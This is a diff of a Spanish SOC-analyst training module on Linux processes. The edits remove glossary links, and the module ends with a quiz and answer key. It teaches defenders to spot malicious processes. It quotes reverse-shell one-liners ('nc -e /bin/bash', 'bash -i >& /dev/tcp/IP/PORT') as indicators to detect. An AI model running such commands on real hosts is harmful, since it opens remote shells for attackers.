@@ -4,7 +4,7 @@
 
 **Módulo 18 – Gestión de Procesos**
 
-**Nivel:** Principiante → Analista <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a> Nivel 1
+**Nivel:** Principiante → Analista SOC Nivel 1
 
 **Antes de comenzar**
 
@@ -12,7 +12,7 @@ Ya dominas:
 
 - ✅ Modelo <a href="../../GLOSARIO.md#osi" target="_blank">OSI</a> y <a href="../../GLOSARIO.md#tcp" target="_blank">TCP</a>/<a href="../../GLOSARIO.md#ip" target="_blank">IP</a>
 
-- ✅ <a href="../../GLOSARIO.md#tcp" target="_blank">TCP</a> y <a href="../../GLOSARIO.md#udp" target="_blank">UDP</a>
+- ✅ TCP y <a href="../../GLOSARIO.md#udp" target="_blank">UDP</a>
 
 - ✅ Puertos
 
@@ -35,7 +35,7 @@ Un proceso es un programa en ejecución.
 
 Todo lo que ocurre en Linux pasa a través de procesos.
 
-Para un Analista <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a>, los procesos son información de oro.
+Para un Analista SOC, los procesos son información de oro.
 
 Un proceso sospechoso puede ser la primera señal de malware, minería de
 criptomonedas o actividad maliciosa.
@@ -67,9 +67,9 @@ Al finalizar este módulo podrás:
 
 - Detectar procesos anómalos como indicador de compromiso.
 
-- Aplicar estos conocimientos en investigaciones de un <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a>.
+- Aplicar estos conocimientos en investigaciones de un SOC.
 
-- Responder preguntas técnicas de una entrevista para Analista <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a> Nivel
+- Responder preguntas técnicas de una entrevista para Analista SOC Nivel
 1.
 
 **1. ¿Qué es un proceso?**
@@ -95,11 +95,11 @@ Puedes tener un solo manual (programa) y muchos empleados trabajando con
 él (procesos).
 
 Abre <a href="../../GLOSARIO.md#dos" target="_blank">dos</a> terminales y ejecuta el mismo comando: el programa es el mismo,
-pero Linux crea **<a href="../../GLOSARIO.md#dos" target="_blank">dos</a> procesos distintos**.
+pero Linux crea **dos procesos distintos**.
 
-**El <a href="../../GLOSARIO.md#pid" target="_blank">PID</a>**
+**El PID**
 
-Cada proceso tiene un número único: el **<a href="../../GLOSARIO.md#pid" target="_blank">PID</a> (Process Identifier)**.
+Cada proceso tiene un número único: el **PID (Process Identifier)**.
 
 Es como el **número de empleado** de cada proceso.
 
@@ -114,9 +114,9 @@ Todo proceso tiene un padre.
 
 Cuando un proceso crea otro, el nuevo es su **hijo**.
 
-Proceso padre (PPID) → Crea → Proceso hijo (<a href="../../GLOSARIO.md#pid" target="_blank">PID</a>)
+Proceso padre (PPID) → Crea → Proceso hijo (PID)
 
-**¿Por qué importa esto en un <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a>?**
+**¿Por qué importa esto en un SOC?**
 
 Porque el malware casi siempre es un proceso hijo.
 
@@ -128,20 +128,20 @@ del sistema que ejecuta un binario desde `/tmp`.
 
 Esa relación padre-hijo se analiza en cada investigación.
 
-**El primer proceso: <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> 1**
+**El primer proceso: PID 1**
 
-En Linux existe un primer proceso con <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> **1**.
+En Linux existe un primer proceso con PID **1**.
 
 Es el ancestro de todos los demás procesos.
 
 En los sistemas modernos es **systemd**; en los antiguos era **init**.
 
-Todo lo que corre en Linux desciende del <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> 1.
+Todo lo que corre en Linux desciende del PID 1.
 
-Si ves un proceso con <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> 1 que no es systemd ni init, es motivo de
+Si ves un proceso con PID 1 que no es systemd ni init, es motivo de
 alarma.
 
-**2. ¿Por qué es importante para un <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a>?**
+**2. ¿Por qué es importante para un SOC?**
 
 El malware siempre deja rastros.
 
@@ -157,18 +157,18 @@ Un **servicio falso** se inicia con el sistema.
 
 Ningún malware puede ejecutarse sin crear un proceso.
 
-Por eso los analistas <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a> revisan procesos constantemente.
+Por eso los analistas SOC revisan procesos constantemente.
 
 **Correlación con el <a href="../../GLOSARIO.md#edr" target="_blank">EDR</a>**
 
-Un **<a href="../../GLOSARIO.md#edr" target="_blank">EDR</a> (Endpoint Detection and Response)** recopila datos de los
-procesos de cada equipo: nombre, <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> y PPID, usuario, ruta del
+Un **EDR (Endpoint Detection and Response)** recopila datos de los
+procesos de cada equipo: nombre, PID y PPID, usuario, ruta del
 ejecutable, uso de CPU y memoria, y línea de comandos.
 
 Cuando llega una alerta al <a href="../../GLOSARIO.md#siem" target="_blank">SIEM</a>, el primer paso suele ser: ¿qué proceso
 generó este evento?
 
-Saber analizar procesos a mano te permite validar lo que el <a href="../../GLOSARIO.md#edr" target="_blank">EDR</a> reporta.
+Saber analizar procesos a mano te permite validar lo que el EDR reporta.
 
 **3. Listar procesos con `ps`**
 
@@ -186,7 +186,7 @@ Ejemplo:
 
 Salida típica:
 
-USER <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND
+USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND
 
 <a href="../../GLOSARIO.md#root" target="_blank">root</a> 1 0.0 0.0 166000 11660 ? Ss 09:15 0:01 /sbin/init
 
@@ -204,13 +204,13 @@ Ejemplo:
 
 Salida típica:
 
-UID <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> PPID C STIME TTY TIME CMD
+UID PID PPID C STIME TTY TIME CMD
 
-<a href="../../GLOSARIO.md#root" target="_blank">root</a> 1 0 0 09:15 ? 00:00:01 /sbin/init
+root 1 0 0 09:15 ? 00:00:01 /sbin/init
 
 www-data 732 1 0 09:16 ? 00:00:02 nginx: worker
 
-jo 1240 732 0 10:02 pts/0 00:00:05 <a href="../../GLOSARIO.md#bash" target="_blank">bash</a>
+jo 1240 732 0 10:02 pts/0 00:00:05 bash
 
 **¿Cuál usar?**
 
@@ -232,7 +232,7 @@ Un servidor web corre como `www-data`.
 
 Si un proceso de sistema lo ejecuta un usuario raro, investiga.
 
-**<a href="../../GLOSARIO.md#pid" target="_blank">PID</a>** → el identificador único del proceso.
+**PID** → el identificador único del proceso.
 
 **%CPU** → porcentaje de CPU que consume.
 
@@ -272,7 +272,7 @@ Un proceso llamado `nginx` corriendo desde `/tmp` no es `nginx`.
 
 `ps -u www-data` → procesos de un usuario concreto.
 
-`ps -p 732` → información del proceso con <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> 732.
+`ps -p 732` → información del proceso con PID 732.
 
 `ps aux | grep miner` → busca indicios de mineros.
 
@@ -290,13 +290,13 @@ Ejemplo:
 
 `top`
 
-Tiene <a href="../../GLOSARIO.md#dos" target="_blank">dos</a> zonas: la cabecera con la información del sistema y la lista
+Tiene dos zonas: la cabecera con la información del sistema y la lista
 de procesos ordenada por consumo.
 
 La cabecera muestra la carga media (load average), los procesos totales
 y el uso de CPU y memoria.
 
-Las columnas son similares a `ps aux`: <a href="../../GLOSARIO.md#pid" target="_blank">PID</a>, USER, PR/NI, VIRT/RES, S,
+Las columnas son similares a `ps aux`: PID, USER, PR/NI, VIRT/RES, S,
 %CPU, %MEM, TIME+ y COMMAND.
 
 La tecla `P` ordena por %CPU.
@@ -321,7 +321,7 @@ Permite desplazarte, buscar y terminar procesos.
 
 En un servidor comprometido puedes quedarte con `top`.
 
-**¿Qué busca un <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a> en `top`?**
+**¿Qué busca un SOC en `top`?**
 
 - Un proceso con %CPU altísimo.
 
@@ -464,11 +464,11 @@ Linux muestra: `[1] 4123`.
 
 - `[1]` → número de trabajo (job).
 
-- `4123` → <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> del proceso.
+- `4123` → PID del proceso.
 
 **Ver los trabajos**
 
-`jobs` muestra los trabajos del <a href="../../GLOSARIO.md#shell" target="_blank">shell</a> actual.
+`jobs` muestra los trabajos del shell actual.
 
 **Traer un trabajo al primer plano**
 
@@ -509,7 +509,7 @@ Pero recuerda: si eso es un minero, tú lo que harás es matarlo.
 
 `/proc` es un sistema de archivos **virtual**.
 
-No existe en el disco: lo genera el <a href="../../GLOSARIO.md#kernel" target="_blank">kernel</a> en memoria.
+No existe en el disco: lo genera el kernel en memoria.
 
 Contiene información de todos los procesos.
 
@@ -557,7 +557,7 @@ Revela la ruta verdadera del binario.
 
 Un proceso llamado `httpd` que apunta a `/tmp/...` es sospechoso.
 
-**¿Por qué es importante en un <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a>?**
+**¿Por qué es importante en un SOC?**
 
 Porque los nombres pueden mentir.
 
@@ -570,7 +570,7 @@ del usuario.
 
 Ejemplos: `nginx`, `sshd`, `mysqld`.
 
-Suelen terminar en **d** (<a href="../../GLOSARIO.md#daemon" target="_blank">daemon</a>).
+Suelen terminar en **d** (daemon).
 
 **systemd**
 
@@ -578,11 +578,11 @@ Es el sistema de inicio de Linux moderno.
 
 Gestiona los servicios del sistema.
 
-Es el proceso con <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> 1 en la mayoría de las distros.
+Es el proceso con PID 1 en la mayoría de las distros.
 
 **Comandos básicos con `systemctl`**
 
-`systemctl status nginx` → estado del servicio, su <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> y sus logs.
+`systemctl status nginx` → estado del servicio, su PID y sus logs.
 
 `systemctl start nginx` → inicia el servicio.
 
@@ -601,7 +601,7 @@ Es el proceso con <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> 1 en l
 `systemctl list-unit-files | grep enabled` → servicios que inician con
 el sistema.
 
-**¿Por qué es importante en un <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a>?**
+**¿Por qué es importante en un SOC?**
 
 Los atacantes instalan persistencia como servicios.
 
@@ -654,7 +654,7 @@ El atacante compromete una aplicación y esta lanza un proceso
 malicioso.
 
 Ejemplos: `bash` como hijo de `nginx`, Python como hijo de `apache`, o
-una <a href="../../GLOSARIO.md#shell" target="_blank">shell</a> lanzada desde `php-fpm`.
+una shell lanzada desde `php-fpm`.
 
 **Cómo detectarlo**
 
@@ -664,12 +664,12 @@ Un proceso `bash` cuyo PPID es el servidor web es muy sospechoso.
 
 `ps -ef | grep -E "bash|python|nc"` y revisa la columna PPID.
 
-**Ataque 4 – Reverse <a href="../../GLOSARIO.md#shell" target="_blank">shell</a> como proceso de red**
+**Ataque 4 – Reverse shell como proceso de red**
 
-El atacante abre una <a href="../../GLOSARIO.md#shell" target="_blank">shell</a> hacia su servidor.
+El atacante abre una shell hacia su servidor.
 
-Aparecen procesos como `nc -e /bin/bash`, `<a href="../../GLOSARIO.md#bash" target="_blank">bash</a> -i >&
-/dev/<a href="../../GLOSARIO.md#tcp" target="_blank">tcp</a>/<a href="../../GLOSARIO.md#ip" target="_blank">IP</a>/PORT 0>&1`, `socat` o `ncat`.
+Aparecen procesos como `nc -e /bin/bash`, `bash -i >&
+/dev/tcp/IP/PORT 0>&1`, `socat` o `ncat`.
 
 Señales en `ps`: shells raras, combinaciones con `/dev/tcp` y conexiones
 de red desde procesos que no deberían tenerlas.
@@ -706,7 +706,7 @@ cada inicio.
 
 - Establecer un **baseline** de procesos esperados.
 
-- Correlacionar con el <a href="../../GLOSARIO.md#edr" target="_blank">EDR</a> y el <a href="../../GLOSARIO.md#siem" target="_blank">SIEM</a>.
+- Correlacionar con el EDR y el SIEM.
 
 - Revisar los servicios activos contra lo conocido.
 
@@ -732,7 +732,7 @@ Ejemplo de un servidor web: nginx, mysqld, sshd, cron y systemd.
 
 Todo lo que no esté en el baseline debe investigarse.
 
-**13. Aplicación práctica en un <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a>**
+**13. Aplicación práctica en un SOC**
 
 **Caso 1 – Un proceso con 300% de CPU**
 
@@ -742,7 +742,7 @@ y usuario inusual.
 Posible interpretación: minería de criptomonedas o malware que consume
 recursos.
 
-Investigación: ver el <a href="../../GLOSARIO.md#pid" target="_blank">PID</a>, revisar `ls -l /proc/PID/exe`, el usuario, el
+Investigación: ver el PID, revisar `ls -l /proc/PID/exe`, el usuario, el
 PPID y `ss -tulpn`, y terminar el proceso si se confirma.
 
 **Caso 2 – Un binario en `/tmp` ejecutado por www-data**
@@ -755,16 +755,16 @@ Posible interpretación: webshell desplegada por un atacante o payload
 cargado desde una vulnerabilidad web.
 
 Investigación: revisar la línea de comandos, los logs del servidor web,
-buscar otros binarios en `/tmp` y correlacionar con el PPID y el <a href="../../GLOSARIO.md#edr" target="_blank">EDR</a>.
+buscar otros binarios en `/tmp` y correlacionar con el PPID y el EDR.
 
 **Caso 3 – Procesos de red raros**
 
 `ps aux` muestra procesos como `nc`, `socat` o `ncat`, o un `bash` con
 `/dev/tcp`.
 
-Posible interpretación: reverse <a href="../../GLOSARIO.md#shell" target="_blank">shell</a> activa o comunicación con un C2.
+Posible interpretación: reverse shell activa o comunicación con un C2.
 
-Investigación: `netstat -tulpn`, `ss -tulpn`, identificar la <a href="../../GLOSARIO.md#ip" target="_blank">IP</a> y el
+Investigación: `netstat -tulpn`, `ss -tulpn`, identificar la IP y el
 puerto de destino, buscar el origen en el firewall y revisar el padre.
 
 **Caso 4 – Un servicio recién instalado**
@@ -787,7 +787,7 @@ red.
 
 Juntas forman la foto completa de un incidente.
 
-**14. Lo que esperan de un Analista <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a> Nivel 1**
+**14. Lo que esperan de un Analista SOC Nivel 1**
 
 Cuando llegue una alerta, deberás responder preguntas como:
 
@@ -815,9 +815,9 @@ No se trata solo de listar procesos; se trata de **interpretarlos**.
 
 - Es un programa en ejecución.
 
-- Tiene un <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> único y un PPID (su padre).
+- Tiene un PID único y un PPID (su padre).
 
-- Todos descienden del <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> 1.
+- Todos descienden del PID 1.
 
 **Comandos principales**
 
@@ -884,9 +884,9 @@ No se trata solo de listar procesos; se trata de **interpretarlos**.
 | **Concepto**      | **Debes recordar**                                            |
 |-------------------|---------------------------------------------------------------|
 | Proceso           | Un programa en ejecución.                                     |
-| <a href="../../GLOSARIO.md#pid" target="_blank">PID</a>               | Identificador único del proceso.                              |
+| PID               | Identificador único del proceso.                              |
 | PPID              | Identificador del proceso padre.                              |
-| <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> 1             | El primer proceso: systemd (o init).                          |
+| PID 1             | El primer proceso: systemd (o init).                          |
 | `ps aux`          | Lista todos los procesos del sistema.                         |
 | `top`             | Monitoreo en tiempo real.                                     |
 | R                 | Running.                                                      |
@@ -895,13 +895,13 @@ No se trata solo de listar procesos; se trata de **interpretarlos**.
 | SIGTERM           | Señal 15, terminación elegante.                               |
 | SIGKILL           | Señal 9, terminación forzada.                                 |
 | Background        | Ejecutar en segundo plano con `&`.                            |
-| <a href="../../GLOSARIO.md#daemon" target="_blank">Daemon</a>            | Proceso que corre en segundo plano.                           |
-| systemd           | Gestor de servicios, proceso <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> 1.                           |
+| Daemon            | Proceso que corre en segundo plano.                           |
+| systemd           | Gestor de servicios, proceso PID 1.                           |
 | `/proc`           | Sistema virtual con datos de procesos.                        |
 | `/proc/PID/exe`   | La ruta real del ejecutable.                                  |
 | `ss -tulpn`       | Muestra conexiones de red y su proceso.                       |
 
-**🎓 Consejo como tu instructor de <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a>**
+**🎓 Consejo como tu instructor de SOC**
 
 Vas a vivir en la terminal.
 
@@ -916,7 +916,7 @@ Entrena tu mente para hacer asociaciones rápidas.
 
 - **Proceso con nombre de sistema en una ruta rara** = sospechoso.
 
-- **Proceso legítimo lanzando una <a href="../../GLOSARIO.md#shell" target="_blank">shell</a>** = sospechoso.
+- **Proceso legítimo lanzando una shell** = sospechoso.
 
 - **Servicio nuevo que no está en tu baseline** = sospechoso.
 
@@ -942,7 +942,7 @@ Cuando mires `top` y veas un proceso usando 300% de CPU, no pienses
 Piensa: "¿Qué es? ¿De dónde salió? ¿Quién lo lanzó? ¿A dónde se
 conecta?"
 
-Esa secuencia de preguntas es la que te hará crecer en el <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a>.
+Esa secuencia de preguntas es la que te hará crecer en el SOC.
 
 Los procesos son los actores del sistema.
 
@@ -950,17 +950,17 @@ Tu trabajo es saber quién está en el escenario.
 
 ---
 
-**📘 Carrera de Analista <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a>**
+**📘 Carrera de Analista SOC**
 
 **Semana 3 – Linux**
 
 **Evaluación – Módulo 18: Gestión de Procesos**
 
-**Nivel:** Principiante → Analista <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a> Nivel 1
+**Nivel:** Principiante → Analista SOC Nivel 1
 
 **Instrucciones:** Responde las siguientes preguntas sin consultar el
 material de estudio. Piensa como si estuvieras realizando una prueba
-para ingresar a un **<a href="../../GLOSARIO.md#soc" target="_blank">SOC</a> Nivel 1**. Encontrarás preguntas teóricas y
+para ingresar a un **SOC Nivel 1**. Encontrarás preguntas teóricas y
 casos prácticos basados en situaciones reales. Al finalizar encontrarás
 las respuestas con su justificación.
 
@@ -978,16 +978,16 @@ las respuestas con su justificación.
 
 **Pregunta 2**
 
-¿Cuál es la diferencia entre el **<a href="../../GLOSARIO.md#pid" target="_blank">PID</a>** y el **PPID** de un proceso?
+¿Cuál es la diferencia entre el **PID** y el **PPID** de un proceso?
 
-**A)** El <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> identifica al proceso y el PPID identifica a su proceso
+**A)** El PID identifica al proceso y el PPID identifica a su proceso
 padre.
 
-**B)** El <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> indica la memoria usada y el PPID el uso de CPU.
+**B)** El PID indica la memoria usada y el PPID el uso de CPU.
 
 **C)** Ambos son exactamente lo mismo.
 
-**D)** El PPID identifica al proceso y el <a href="../../GLOSARIO.md#pid" target="_blank">PID</a> a su proceso padre.
+**D)** El PPID identifica al proceso y el PID a su proceso padre.
 
 **Pregunta 3**
 
@@ -1025,7 +1025,7 @@ En `top`, un proceso desconocido que ocupa el primer puesto con un
 
 **C)** Un problema exclusivamente de red.
 
-**D)** Una actualización del <a href="../../GLOSARIO.md#kernel" target="_blank">kernel</a>.
+**D)** Una actualización del kernel.
 
 **Pregunta 6**
 
@@ -1068,7 +1068,7 @@ Un proceso se muestra en la lista con la letra **Z**. ¿Qué significa?
 **Pregunta 9**
 
 ¿Qué comando de `systemctl` muestra si un servicio está **activo**, su
-**<a href="../../GLOSARIO.md#pid" target="_blank">PID</a>** y sus últimos **logs**?
+**PID** y sus últimos **logs**?
 
 **A)** `systemctl status nginx`
 
@@ -1078,7 +1078,7 @@ Un proceso se muestra en la lista con la letra **Z**. ¿Qué significa?
 
 **D)** `systemctl disable nginx`
 
-**Pregunta 10 (Caso práctico <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a>)**
+**Pregunta 10 (Caso práctico SOC)**
 
 En `top` observas un proceso desconocido que consume **300% de CPU** y
 cuyo ejecutable se encuentra en **`/tmp`**.
@@ -1090,7 +1090,7 @@ cuyo ejecutable se encuentra en **`/tmp`**.
 **B)** Un posible minero de criptomonedas o malware ejecutándose desde
 una ubicación inusual.
 
-**C)** El proceso del <a href="../../GLOSARIO.md#kernel" target="_blank">kernel</a> `kworker` normal.
+**C)** El proceso del kernel `kworker` normal.
 
 **D)** Un proceso del sistema `systemd` legítimo.
 
@@ -1113,7 +1113,7 @@ corriendo en la memoria.
 
 **Justificación**
 
-El **<a href="../../GLOSARIO.md#pid" target="_blank">PID</a>** es el identificador único del proceso.
+El **PID** es el identificador único del proceso.
 
 El **PPID** es el identificador del proceso **padre** que lo creó.
 
@@ -1125,7 +1125,7 @@ Analizar la relación padre-hijo es clave para detectar malware.
 
 **Justificación**
 
-**`/proc`** es un sistema de archivos **virtual** generado por el <a href="../../GLOSARIO.md#kernel" target="_blank">kernel</a>
+**`/proc`** es un sistema de archivos **virtual** generado por el kernel
 en memoria.
 
 Contiene información de todos los procesos.
@@ -1138,7 +1138,7 @@ Por ejemplo, `/proc/PID/exe` revela la ruta real del ejecutable.
 
 **Justificación**
 
-`ps aux` lista **todos los procesos** con columnas como USER, <a href="../../GLOSARIO.md#pid" target="_blank">PID</a>,
+`ps aux` lista **todos los procesos** con columnas como USER, PID,
 %CPU, %MEM, STAT, TIME y COMMAND.
 
 `ps -ef` también sirve e incluye el PPID.
@@ -1201,7 +1201,7 @@ El proceso corre y la terminal queda libre.
 
 `systemctl status nginx` muestra el **estado** de un servicio.
 
-Indica si está activo o detenido, su **<a href="../../GLOSARIO.md#pid" target="_blank">PID</a>** y sus últimos **logs**.
+Indica si está activo o detenido, su **PID** y sus últimos **logs**.
 
 Un servicio desconocido o recién creado puede ser persistencia de un
 atacante.
@@ -1221,7 +1221,7 @@ privilegios especiales.
 
 Como analista deberías:
 
-- Identificar el <a href="../../GLOSARIO.md#pid" target="_blank">PID</a>.
+- Identificar el PID.
 
 - Revisar `/proc/PID/exe`.
 
@@ -1239,4 +1239,4 @@ Como analista deberías:
 | **8–9**                  | 🟢 **Muy buen nivel.** Interpretas `ps`, `top` y las señales de Linux correctamente.                                                 |
 | **6–7**                  | 🟡 **Buen progreso.** Repasa los estados de los procesos y la diferencia entre SIGTERM y SIGKILL.                                     |
 | **4–5**                  | 🟠 **Necesitas reforzar algunos conceptos.** Vuelve a estudiar `ps`, `top` y el manejo de procesos en segundo plano.                 |
-| **0–3**                  | 🔴 **Es recomendable repasar el módulo completo.** Detectar procesos anómalos es una habilidad central de un Analista <a href="../../GLOSARIO.md#soc" target="_blank">SOC</a>.            |
+| **0–3**                  | 🔴 **Es recomendable repasar el módulo completo.** Detectar procesos anómalos es una habilidad central de un Analista SOC.            |
